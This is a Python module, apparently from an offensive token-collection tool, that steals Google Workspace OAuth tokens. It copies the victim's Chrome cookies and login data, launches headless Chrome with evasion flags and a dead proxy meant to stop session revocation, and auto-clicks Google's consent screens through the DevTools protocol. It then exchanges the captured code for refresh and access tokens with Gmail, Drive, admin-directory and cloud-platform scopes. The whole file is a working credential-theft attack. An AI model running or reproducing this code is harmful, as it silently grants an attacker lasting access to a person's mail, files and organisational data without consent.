"""Google Workspace OAuth hijack via headless Chrome with copied user profile.

Leverages the user's existing Chrome session to silently authorize an OAuth
grant using gws-cli's client_secret.json.  Zero external dependencies — uses
the system Chrome binary and Python stdlib only.

Flow:
  1. Read gws-cli client_secret.json for OAuth client_id / client_secret
  2. Copy minimal Chrome profile to temp dir (cookies + state)
  3. Start a localhost HTTP server to capture the OAuth redirect
  4. Launch headless Chrome with the copied profile → OAuth consent URL
  5. Google recognises the existing session → auto-approves (if scopes match)
  6. Capture the auth code from the redirect
  7. Exchange auth code for refresh_token + access_token
  8. Clean up temp profile
"""

from __future__ import annotations

import http.server
import json
import os
import shutil
import signal
import socket
import subprocess
import tempfile
import threading
import time
import urllib.error
import urllib.parse
import urllib.request
from pathlib import Path
from typing import List, Optional

from ..base import BaseCollector
from .. import CollectorRegistry
from ...types import CollectedToken, DiscoveredToken
from ...secure import secure
from ...platform_utils import (
    chrome_user_data_dir,
    get_platform,
    home_dir,
)

# GWS-CLI scopes that map to Ninken services
GWS_SCOPES = [
    "openid",
    "https://www.googleapis.com/auth/userinfo.email",
    "https://www.googleapis.com/auth/userinfo.profile",
    "https://www.googleapis.com/auth/gmail.readonly",
    "https://www.googleapis.com/auth/drive.readonly",
    "https://www.googleapis.com/auth/calendar.readonly",
    "https://www.googleapis.com/auth/admin.directory.user.readonly",
    "https://www.googleapis.com/auth/admin.directory.group.readonly",
    "https://www.googleapis.com/auth/chat.messages.readonly",
    "https://www.googleapis.com/auth/chat.spaces.readonly",
    "https://www.googleapis.com/auth/cloud-platform",
]

# Files to copy from Chrome profile — enough for session cookies + login state
PROFILE_FILES = [
    "Local State",
    # Cookies (including WAL and journal)
    "Default/Cookies",
    "Default/Cookies-journal",
    "Default/Cookies-wal",
    "Default/Network/Cookies",
    "Default/Network/Cookies-journal",
    "Default/Network/Cookies-wal",
    # Login state (saved credentials, session tokens)
    "Default/Login Data",
    "Default/Login Data-journal",
    "Default/Login Data-wal",
    "Default/Login Data For Account",
    "Default/Login Data For Account-journal",
    "Default/Web Data",
    "Default/Web Data-journal",
    # Chrome config
    "Default/Preferences",
    "Default/Secure Preferences",
    # Extension cookies (some auth flows use these)
    "Default/Extension Cookies",
    "Default/Extension Cookies-journal",
]

# Directories to copy (shallow — session state)
PROFILE_DIRS = [
    "Default/Session Storage",
    "Default/Sessions",
]

TOKEN_ENDPOINT = "https://oauth2.googleapis.com/token"


def _find_chrome() -> Optional[str]:
    """Find the Chrome binary on the current platform."""
    plat = get_platform()
    candidates = []

    if plat == "macos":
        candidates = [
            "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome",
            "/Applications/Chromium.app/Contents/MacOS/Chromium",
            os.path.expanduser(
                "~/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
            ),
        ]
    elif plat == "windows":
        for env_var in ("PROGRAMFILES", "PROGRAMFILES(X86)", "LOCALAPPDATA"):
            base = os.environ.get(env_var, "")
            if base:
                candidates.append(
                    os.path.join(base, "Google", "Chrome", "Application", "chrome.exe")
                )
    else:  # Linux
        candidates = [
            "/usr/bin/google-chrome",
            "/usr/bin/google-chrome-stable",
            "/usr/bin/chromium-browser",
            "/usr/bin/chromium",
            "/snap/bin/chromium",
        ]

    for path in candidates:
        if os.path.isfile(path):
            return path

    # Fallback: try PATH
    for name in ("google-chrome", "google-chrome-stable", "chromium", "chrome"):
        result = shutil.which(name)
        if result:
            return result

    return None


def _find_free_port() -> int:
    """Find a free TCP port on localhost."""
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def _gws_cli_dir() -> Path:
    """Return the gws-cli config directory."""
    return home_dir() / ".config" / "gws"


class _AuthCodeHandler(http.server.BaseHTTPRequestHandler):
    """HTTP handler that captures the OAuth redirect and extracts the auth code."""

    auth_code: Optional[str] = None
    error: Optional[str] = None

    def do_GET(self):  # noqa: N802
        parsed = urllib.parse.urlparse(self.path)
        params = urllib.parse.parse_qs(parsed.query)

        if "code" in params:
            _AuthCodeHandler.auth_code = params["code"][0]
            self._respond(
                "<html><body><h2>&#10003; Token captured</h2>"
                "<p>You can close this tab. NinLoader has your token.</p>"
                "</body></html>"
            )
        elif "error" in params:
            _AuthCodeHandler.error = params.get("error", ["unknown"])[0]
            self._respond(
                f"<html><body><h2>OAuth error: {_AuthCodeHandler.error}</h2>"
                "</body></html>"
            )
        else:
            self._respond("<html><body>Waiting for OAuth redirect...</body></html>")

    def _respond(self, html: str):
        self.send_response(200)
        self.send_header("Content-Type", "text/html")
        self.end_headers()
        self.wfile.write(html.encode())

    def log_message(self, format, *args):  # noqa: A002
        pass  # Silence HTTP logs


@CollectorRegistry.register
class BrowserHijackCollector(BaseCollector):
    """Steal Google Workspace OAuth tokens via headless Chrome profile hijack."""

    service = "google"
    source = "browser_hijack"
    stealth_score = 4

    def _detect_login_hint(self) -> str:
        """Try to detect the primary Google account from gcloud or gws-cli."""
        # Check gcloud active account
        try:
            result = subprocess.run(
                ["gcloud", "config", "get-value", "account"],
                capture_output=True, text=True, timeout=5,
            )
            if result.returncode == 0 and "@" in result.stdout:
                return result.stdout.strip()
        except (FileNotFoundError, subprocess.TimeoutExpired):
            pass

        # Check gcloud credentials.db for any account
        import sqlite3
        creds_db = home_dir() / ".config" / "gcloud" / "credentials.db"
        if creds_db.exists():
            try:
                conn = sqlite3.connect(str(creds_db))
                row = conn.execute(
                    "SELECT account_id FROM credentials WHERE account_id LIKE '%@%' LIMIT 1"
                ).fetchone()
                conn.close()
                if row:
                    return row[0]
            except Exception:
                pass

        return ""

    def _read_client_secret(self) -> Optional[dict]:
        """Read gws-cli client_secret.json."""
        path = _gws_cli_dir() / "client_secret.json"
        if not path.exists():
            return None
        try:
            data = json.loads(path.read_text())
            installed = data.get("installed", {})
            return {
                "client_id": installed.get("client_id"),
                "client_secret": installed.get("client_secret"),
                "token_uri": installed.get("token_uri", TOKEN_ENDPOINT),
            }
        except (json.JSONDecodeError, KeyError):
            return None

    def _copy_profile(self) -> Optional[str]:
        """Copy Chrome profile files to a temp directory."""
        chrome_dir = chrome_user_data_dir()
        if not chrome_dir.exists():
            return None

        temp_dir = tempfile.mkdtemp(prefix="ninloader_chrome_")

        # Copy individual files
        for rel_path in PROFILE_FILES:
            src = chrome_dir / rel_path
            dst = Path(temp_dir) / rel_path
            if src.exists():
                dst.parent.mkdir(parents=True, exist_ok=True)
                try:
                    shutil.copy2(str(src), str(dst))
                except (PermissionError, OSError):
                    continue

        # Copy directories (session state)
        for rel_dir in PROFILE_DIRS:
            src = chrome_dir / rel_dir
            dst = Path(temp_dir) / rel_dir
            if src.exists() and src.is_dir():
                try:
                    shutil.copytree(str(src), str(dst), dirs_exist_ok=True)
                except (PermissionError, OSError):
                    continue

        # Chrome needs a First Run sentinel to skip setup wizard
        (Path(temp_dir) / "First Run").touch()

        # Patch Preferences to avoid "Restore pages" dialog
        prefs_path = Path(temp_dir) / "Default" / "Preferences"
        if prefs_path.exists():
            try:
                prefs = json.loads(prefs_path.read_text())
                prefs.setdefault("profile", {})["exit_type"] = "Normal"
                prefs.setdefault("profile", {})["exited_cleanly"] = True
                # Disable session restore
                prefs.setdefault("session", {})["restore_on_startup"] = 4
                prefs_path.write_text(json.dumps(prefs))
            except (json.JSONDecodeError, OSError):
                pass

        return temp_dir

    def discover(self) -> List[DiscoveredToken]:
        results = []

        chrome = _find_chrome()
        client = self._read_client_secret()
        chrome_dir = chrome_user_data_dir()
        has_cookies = (
            (chrome_dir / "Default" / "Cookies").exists()
            or (chrome_dir / "Default" / "Network" / "Cookies").exists()
        )

        if chrome and client and has_cookies:
            details = (
                f"Chrome + gws-cli client_secret.json — "
                f"headless OAuth hijack (client_id={client['client_id'][:20]}...)"
            )
            results.append(
                DiscoveredToken(
                    service=self.service,
                    source=self.source,
                    path=str(_gws_cli_dir() / "client_secret.json"),
                    account_hint="active Chrome Google session",
                    stealth_score=self.stealth_score,
                    details=details,
                )
            )
        else:
            missing = []
            if not chrome:
                missing.append("Chrome binary")
            if not client:
                missing.append("gws-cli client_secret.json")
            if not has_cookies:
                missing.append("Chrome cookies")
            if missing:
                results.append(
                    DiscoveredToken(
                        service=self.service,
                        source=self.source,
                        path="",
                        account_hint="",
                        stealth_score=self.stealth_score,
                        details=f"missing: {', '.join(missing)}",
                    )
                )

        return results

    def collect(self) -> List[CollectedToken]:
        results = []

        # Preflight checks
        chrome = _find_chrome()
        if not chrome:
            self._warn("Chrome binary not found")
            return results

        client = self._read_client_secret()
        if not client or not client.get("client_id"):
            self._warn("gws-cli client_secret.json not found or invalid")
            return results

        # 1. Copy Chrome profile
        self._info("Copying Chrome profile...")
        temp_dir = self._copy_profile()
        if not temp_dir:
            self._warn("Failed to copy Chrome profile")
            return results

        try:
            # 2. Start localhost capture server
            port = _find_free_port()
            redirect_uri = f"http://localhost:{port}"

            server = http.server.HTTPServer(
                ("127.0.0.1", port), _AuthCodeHandler
            )
            server.timeout = 25
            # Handle multiple requests (Google may do preflight/favicon)
            def serve():
                for _ in range(5):
                    server.handle_request()
                    if _AuthCodeHandler.auth_code or _AuthCodeHandler.error:
                        break
            server_thread = threading.Thread(target=serve, daemon=True)
            server_thread.start()

            # 3. Build OAuth URL
            scope = " ".join(GWS_SCOPES)
            # Use prompt=consent so the consent screen appears for CDP
            # to auto-click.  login_hint skips "Choose an account".
            login_hint = self._detect_login_hint()
            self._info(f"login_hint: {login_hint or '(none)'}")
            oauth_params = urllib.parse.urlencode(
                {
                    "client_id": client["client_id"],
                    "redirect_uri": redirect_uri,
                    "response_type": "code",
                    "scope": scope,
                    "access_type": "offline",
                    "prompt": "consent",
                    "login_hint": login_hint,
                },
                quote_via=urllib.parse.quote,
            )
            oauth_url = f"https://accounts.google.com/o/oauth2/auth?{oauth_params}"

            # 4. Launch Chrome with copied profile + remote debugging
            debug_port = _find_free_port()
            # NUCLEAR anti-revocation: route ALL traffic through a dead proxy
            # EXCEPT the OAuth endpoints and localhost (via bypass list).
            # This prevents Chrome from contacting ANY Google validation
            # endpoint that would revoke the copied session cookies.
            self._info("Launching Chrome with CDP debugging...")
            chrome_args = [
                chrome,
                f"--user-data-dir={temp_dir}",
                f"--remote-debugging-port={debug_port}",
                "--no-first-run",
                "--no-default-browser-check",
                "--disable-extensions",
                "--disable-background-networking",
                "--disable-sync",
                "--disable-translate",
                "--disable-component-update",
                "--disable-domain-reliability",
                "--disable-client-side-phishing-detection",
                "--disable-features=MediaRouter,AccountConsistency,"
                "DiceFixAuthErrors,MirrorAccountConsistency",
                # Dead proxy blocks ALL traffic except bypassed hosts
                "--proxy-server=socks5://127.0.0.1:1",
                "--proxy-bypass-list="
                "accounts.google.com,"
                "oauth2.googleapis.com,"
                "www.googleapis.com,"
                "localhost,"
                "127.0.0.1",
                "--window-size=1280,800",
                oauth_url,
            ]

            proc = subprocess.Popen(
                chrome_args,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
            )

            # 5. Connect CDP and auto-click through OAuth flow
            from ...core.cdp import CDPClient, CDPError

            login_email = login_hint or "google.com"

            self._info(f"Connecting CDP on port {debug_port}...")
            cdp = CDPClient(debug_port, timeout=15)
            try:
                time.sleep(1.5)  # Minimal Chrome startup wait
                cdp.connect("accounts.google.com")
                cdp.send("Page.enable")
                self._info("CDP connected — auto-clicking consent flow...")

                # Auto-click loop: handle account chooser → continue → allow
                for attempt in range(8):
                    time.sleep(1)
                    url = cdp.get_url()

                    # Already redirected to localhost? Done!
                    if f"localhost:{port}" in url:
                        self._info("  Redirect captured!")
                        break

                    page_text = cdp.evaluate("document.body.innerText") or ""
                    self._info(f"  [{attempt+1}] URL: ...{url[-60:]}")

                    # Step 1: Account chooser — click the target email
                    if "accountchooser" in url or "signinchooser" in url:
                        clicked = cdp.click_by_text(
                            login_email,
                            tag="li,div[data-email],div[role=link],a"
                        )
                        if clicked:
                            self._info(f"  Clicked account: {login_email}")
                            time.sleep(1.5)
                            continue

                    # Step 2: "Sign in" / "Continue" confirmation page
                    if "Continue" in page_text or "Continuar" in page_text:
                        clicked = (
                            cdp.click_by_text("Continue")
                            or cdp.click_by_text("Continuar")
                            or cdp.click("button[type=submit]")
                        )
                        if clicked:
                            self._info("  Clicked Continue")
                            time.sleep(1.5)
                            continue

                    # Step 3: Permissions/consent page — click Allow
                    if "Allow" in page_text or "Permitir" in page_text:
                        clicked = (
                            cdp.click_by_text("Allow")
                            or cdp.click_by_text("Permitir")
                            or cdp.click("#submit_approve_access")
                        )
                        if clicked:
                            self._info("  Clicked Allow")
                            time.sleep(1.5)
                            continue

                    # Fallback: try any submit button
                    cdp.click("button[type=submit]")

            except CDPError as e:
                self._warn(f"CDP error: {e}")
            finally:
                cdp.close()

            # 6. Wait for redirect to capture server
            self._info(f"Waiting for OAuth redirect on port {port}...")
            deadline = time.time() + 15
            while (
                time.time() < deadline
                and _AuthCodeHandler.auth_code is None
                and _AuthCodeHandler.error is None
            ):
                time.sleep(0.5)

            # Terminate Chrome
            try:
                proc.terminate()
                proc.wait(timeout=5)
            except (subprocess.TimeoutExpired, OSError):
                proc.kill()

            server.server_close()

            # 6. Check result
            if _AuthCodeHandler.error:
                self._warn(f"OAuth error: {_AuthCodeHandler.error}")
                return results

            if not _AuthCodeHandler.auth_code:
                self._warn(
                    "Timed out waiting for OAuth redirect (30s). "
                    "The user may not have an active Google session in Chrome, "
                    "or consent is required (try with a browser that has an active session)."
                )
                return results

            auth_code = _AuthCodeHandler.auth_code
            self._info("Auth code captured! Exchanging for tokens...")

            # Reset class-level state for next run
            _AuthCodeHandler.auth_code = None
            _AuthCodeHandler.error = None

            # 7. Exchange auth code for tokens
            token_data = self._exchange_code(
                auth_code, client, redirect_uri
            )
            if not token_data:
                return results

            # 8. Decode ID token for account info
            email = None
            id_token = token_data.get("id_token", "")
            if id_token:
                email = self._decode_id_token_email(id_token)

            results.append(
                CollectedToken(
                    service=self.service,
                    source=self.source,
                    stealth_score=self.stealth_score,
                    account_id=email,
                    username=email,
                    access_token=secure(token_data.get("access_token", "")),
                    refresh_token=secure(token_data.get("refresh_token", "")),
                    client_id=client["client_id"],
                    client_secret=secure(client["client_secret"]),
                    token_uri=TOKEN_ENDPOINT,
                    scopes=token_data.get("scope", "").split(),
                    expires_at=token_data.get("expires_in"),
                    extra={
                        "grant_type": "browser_hijack",
                        "id_token_present": bool(id_token),
                    },
                )
            )

            self._info(
                f"SUCCESS — GWS refresh token obtained for {email or 'unknown user'}"
            )

        finally:
            # 9. Clean up temp profile
            shutil.rmtree(temp_dir, ignore_errors=True)

        return results

    def _exchange_code(
        self, code: str, client: dict, redirect_uri: str
    ) -> Optional[dict]:
        """Exchange authorization code for access + refresh tokens."""
        data = urllib.parse.urlencode(
            {
                "code": code,
                "client_id": client["client_id"],
                "client_secret": client["client_secret"],
                "redirect_uri": redirect_uri,
                "grant_type": "authorization_code",
            }
        ).encode()

        req = urllib.request.Request(
            TOKEN_ENDPOINT,
            data=data,
            headers={"Content-Type": "application/x-www-form-urlencoded"},
        )

        try:
            with urllib.request.urlopen(req, timeout=30) as resp:
                return json.loads(resp.read().decode())
        except urllib.error.URLError as e:
            self._warn(f"Token exchange failed: {e}")
            return None

    @staticmethod
    def _decode_id_token_email(id_token: str) -> Optional[str]:
        """Extract email from JWT id_token without signature verification."""
        import base64

        parts = id_token.split(".")
        if len(parts) < 2:
            return None
        try:
            # Fix padding
            payload_b64 = parts[1] + "=" * (4 - len(parts[1]) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            return payload.get("email")
        except Exception:
            return None
